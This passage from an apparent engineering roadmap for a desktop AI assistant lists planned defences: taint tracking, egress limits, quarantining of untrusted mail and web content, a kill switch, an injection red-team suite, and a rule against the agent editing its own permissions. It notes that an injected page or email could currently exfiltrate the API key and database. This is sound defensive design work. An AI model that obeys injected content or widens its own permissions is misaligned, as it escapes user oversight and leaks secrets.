| G6 | Replayable SSE: `GET /runs/{id}/events?since=` replays the tape then tails (`Last-Event-ID`) | M |
| G7 | Approvals as rows; park indefinitely; delete the 600 s auto-deny | M |
| G8 | Idempotency key `hash(run_id, step_seq, tool, canonical_args)` + tool ledger + `effect_outbox` | M |
| G9 | Startup reconciliation sweep for expired leases and in-flight outbox rows | S |
| G10 | Budgets replace the 8-round cap: tokens/USD/wall-clock, soft nudge at 60%, `partial` state + Continue | S |
| G11 | Loop detector (≥5 identical consecutive calls) + per-connector circuit breaker | S |
| G12 | Taint tracking on every tool result, monotonic per run, propagated into memories and graph | M |
| G13 | Seal auto-learn against tainted content: provenance flag, excluded from injection by default, review UI | M |
| G14 | Deterministic egress policy keyed on taint: `fetch_url` allowlisted and query-stripped, all external writes forced to ask regardless of standing grants | M |
| G15 | `deny → ask → allow` rule engine with argument specifiers (`gmail_modify(add_labels:Archive)`), deny wins at every scope | M |
| G16 | `action_journal`: pre-write intent rows + computed inverse ops | M |
| G17 | Outbox / delayed send (60–120 s hold + Undo) for all outbound mail | S |
| G18 | Post-write verification — re-read the created event / SENT message onto the journal row | S |
| G19 | Rendered effect previews: punycode-decoded, zero-width stripped, one recipient per line | S |
| G20 | Batched plan-level approval (`propose_plan`, plan token bound to argument digests) | M |
| G21 | Dual-LLM quarantine of `fetch_url`/`gmail_read` bodies via `deepseek-v4-flash`, schema-constrained output | M |
| G22 | Spotlighting/datamarking untrusted results with a per-run random delimiter | S |
| G23 | Write rate limits in the tool layer (≤3 emails/hour, ≤1/run without fresh approval) | S |
| G24 | "While I was away" feed rendered from the journal, per-action undo, honest "no longer undoable" | M |
| G25 | Permissions panel: every standing grant, its origin, fire count, revoke button | S |
| G26 | Three-level kill switch: cancel run / pause-all-and-drain-outbox / revoke-all-grants | M |
| G27 | Tool-use examples (2–3 arg objects) appended to every tool description | S |
| G28 | `response_format: concise\|detailed` on the search/read tools, default concise | S |
| G29 | Error-message rewrite: name field + constraint + corrected example; permission denials steer to an allowed alternative instead of dead-ending | S |
| G30 | Pagination + `total`/`has_more` replacing the 24 000-char truncation | S |
| G31 | Stop injecting tools resolved to `off`; strip schema noise | S |
| G32 | Tool consolidation 25 → ~14 (`todos(action)`, `board(action)`, `gmail_find(include_body)`, `current_time` into the prompt) | M |
| G33 | Tool results as handles: full blob in SQLite, preview + `result_id` in context, `read_tool_result(id, offset, limit)` | M |
| G34 | `ToolResult(model_content, user_artifacts, handle)` envelope with an audience split | M |
| G35 | Parallel execution when every call in the batch is `danger='safe'`; bounded concurrency | S |
| G36 | Microcompaction: clear all but the last 3 tool results above a threshold, visible boundary event | S/M |
| G37 | Full compaction via `deepseek-v4-flash` with an explicit preserve-list (objective, decisions, writes performed, open errors) | M |
| G38 | `todo_write` plan artifact, re-injected **last** in the prompt, live checklist in the UI | S/M |
| G39 | Deterministic post-condition checks after every `writes`/`external` call | S |
| G40 | `report_result` structured completion + claim grounding against the journal | S |
| G41 | Run-scoped scratchpad table as external memory | S |
| G42 | Verify empirically that `parallel_tool_calls` and strict schemas survive LiteLLM → Fireworks | S |
| G43 | Skills v1: `skills` table, SKILL.md frontmatter, manifest injection (~100 tok each), `view_skill`, `$name` force-inject, global/project/chat scoping | M |
| G44 | Slash commands as the same table, not a second feature | S |
| G45 | Skill induction from successful chats → review queue → user names/edits/enables; never auto-enable | M |
| G46 | Skill hygiene: `use_count`/`success_count`, redundancy flagging, retire/merge prompts | S |
| G47 | Subagent primitive + `research` subagent (read-only tools, own context, ≤1,500-token return) | L |
| G48 | `verifier` subagent for external writes: clean context, read-only, explicit criteria | M |
| G49 | Subagent output sanitisation at the boundary (neutralise control-tag/turn-marker patterns) | S |
| G50 | Eager BM25 tool pre-selection over tool name/description/arg-names (FTS5 already present) | M |
| G51 | `find_tools` escape hatch + per-chat `active_tools`, core tools in fixed prefix order for cache reuse | M |
| G52 | MCP client v1, **stdio only**: single owning task in the FastAPI lifespan + inbox queue (anyio cancel-scope trap), `ClientSessionGroup` with a name hook, schema-hash pinning | L |
| G53 | MCP permission UI: show the tool **description** in the card, annotations propose but never decide `danger`, cap MCP tools at `always_chat`, re-prompt on schema-hash change | M |
| G54 | Elicitation support (flat-primitive form → auto-generated UI, accept/decline/cancel) reusing the approval card. Skip Sampling and Roots — deprecated in 2026-07-28 | M |
| G55 | Plan/Act mode enforced by danger level (read-only tools only in Plan) | M |
| G56 | Code-mode `run_agent_code`: stub module tree in the sandbox + AF_UNIX broker on the host enforcing permissions and approvals. The broker, not a hint, is the boundary | L |
| G57 | Picked-roots model (`showOpenDialog`, persisted, revocable) + read-only file tools backed by `mdfind` | M |
| G58 | `render_page` via Electron offscreen `BrowserWindow` with a `persist:agent` partition — the clean-vs-logged-in switch | M |
| G59 | Accessibility-tree browsing with `[ref_N]` handles; click/type only after that proves out | L |
| G60 | `run_shortcut` (Shortcuts.app) — the user authors the capability and grants its permissions, so the app holds zero TCC grants | S |
| G61 | AppleScript tier for Calendar/Reminders/Notes, prompts pre-triggered from the Electron UI at onboarding | M |
| G62 | Read-only data-grant kernel: stateful Jupyter + DuckDB over picked roots (snapshot `-wal`/`-shm` for the app's own DB) | M/L |
| G63 | Global hotkey quick panel | M |
| G64 | Jobs table + `croniter` ticker in the FastAPI lifespan, per-job model / tool allowlist / budget / timeout | M |
| G65 | Run history with typed skip reasons (`asleep`, `app_closed`, `overlap`, `quiet_hours`, `budget`, `quarantined`) | S |
| G66 | Catch-up on wake: one run for the most recent missed fire within 7 days, grace window, `late_by_s` in the prompt | S |
| G67 | `powerMonitor` wake hook + wall-clock-gap sleep detection (never trust `suspend`) | S |
| G68 | Background runs are proposal-only: `external` tools produce drafts and cards, never act | S |
| G69 | Agent Inbox on Today: "Needs you" / "While you were away", accept / edit / reject / respond | M |
| G70 | Morning brief as a real job, replacing the manual button; ≤10 cards | S |
| G71 | Pre-meeting brief trigger: calendar proximity, external attendees only, 2–3 bullets, precomputed on idle | M |
| G72 | Quiet hours + notification budget (≤3/day), bounded deferral to the next active moment | S |
| G73 | Email-arrival trigger: narrow filter, `historyId` incremental poll, draft-only output, payload wrapped as untrusted | M |
| G74 | File-watch trigger (`watchdog`/FSEvents, debounced, silent re-index with the cheap model) | S |
| G75 | Conversational automation authoring → proposal card showing resolved schedule, tools, model, budget; first run manual | M |
| G76 | Quarantine after 3 consecutive failures + one explanatory card | S |
| G77 | Repeated-request detector → at most one automation proposal per week | M |
| G78 | Per-run cost in the UI; optional user-supplied webhook per job instead of building push | S |
| G79 | Optional "keep Mac awake while jobs are pending", off by default, with a battery warning | S |
| G80 | OTel GenAI span naming (`chat`, `execute_tool {name}`, `invoke_agent`) persisted to SQLite | S |
| G81 | Replayable run records (stored request bodies, context selection, per-call cost) — every real turn becomes an eval case | M |
| G82 | pytest eval harness with FakeGmail/FakeCalendar/FakeTasks + YAML cases, reporting **pass^3** | L |
| G83 | Red-team suite (~20 injection cases) asserting on the **enforcement layer**, not the model | M |
| G84 | Progressive autonomy ladder per tool+specifier, auto-demotion on deny/undo, capped at rung 4 for irreversible actions — and taint overrides it | M |

**Two things deliberately not on this list.** A heartbeat loop (highest cost, lowest precision; the documented runaway was this app's default model on exactly that pattern — build cron jobs and event triggers instead). And desktop pixel control (OSWorld 2.0 tops out at 20.6% at $15–27/task; the four-tier ladder of HTTP APIs → Shortcuts → AppleScript → AX tree covers the real use cases at a fraction of the risk).

**One governance rule, adopted verbatim from OpenClaw's failure:** the agent may never edit its own permissions, tool allowlists or budgets. Schedule self-modification is fine; capability self-modification never.

Suggested order: **G1–G4 first and immediately** (live defects, all S). Then the durable-run spine G5–G11, because Tracks 3 and 4 both dead-end without it. Then the safety layer G12–G19 before any autonomy increase, since this app reads mail and browses the web. Then the cheap loop-quality wins G27–G31 and G35, which are the best effort-to-benefit ratio in the document. Then G32–G42, G43–G46 (skills), G47–G49 (subagents), G64–G70 (scheduling + inbox). MCP (G52–G54), code mode (G56) and environment reach (G57–G63) after the eval harness G82 exists, not before.

## Combined next steps

Track 5 reorders this list. Four live defects (G1–G4) outrank every feature below, and the durable-run
spine (G5–G11) turns out to be the shared prerequisite for L1, L3, L4, A8 and A9 — all of which were
previously listed as independent.

0. **Before anything else:** G1 sandbox profile, G2 SSRF guard, G3 sidecar auth, G4 CSP images. All S,
   all live today. G1 and G2 together currently allow an injected web page or email to read the
   Fireworks key and the whole database and send it out, with no approval card shown.
1. **Cheap wins this week:** G27 tool-use examples (72%→90% on parameter handling), G29 error
   messages that steer, G30 pagination replacing blind truncation, G31 stop injecting `off` tools,
   G10 budgets replacing the 8-round cap, G11 loop detector, M1 provenance, M2 reconciliation,
   M3 decay, A3 cost tracking, R2 reranking, R4 token budget.
2. **The spine:** G5 durable runs, G6 replayable SSE, G7 approvals as rows, G8 idempotency + outbox.
   This is L1's approval queue and A9's session tape, done once. L2's write journal becomes G16/G17.
3. **Safety before autonomy:** G12 taint tracking, G13 sealing auto-learn, G14 egress policy,
   G15 the deny→ask→allow rule engine, G18 post-write verification, G20 plan-level approval.
   This app reads mail and browses the web; none of the proactive features should ship ahead of these.
4. **Then:** G35 parallel reads, G33 result handles, G36 microcompaction, G38 the plan artifact,
   G39 post-condition checks, G43 skills (which subsume A10 and give L3/L7/L10 a home),
   R1 hybrid retrieval, A2 conversation tree, M4 memory blocks.
5. **Proactive, once the spine exists:** G64 jobs + croniter ticker, G65 skip reasons, G66 catch-up on
   wake, G68 proposal-only background runs, G69 the Agent Inbox on Today, G70 morning brief as a job,
   G71 pre-meeting briefs. L4's heartbeat is **dropped** — see Track 5.
6. **After the eval harness (G82), not before:** G52 MCP client, G56 code mode, G57–G63 environment
   reach, G47 subagents, L11 time blocking, M6 bi-temporal graph, A11 artifacts, A13 packaging,
   A12 voice, L16 meeting recap.
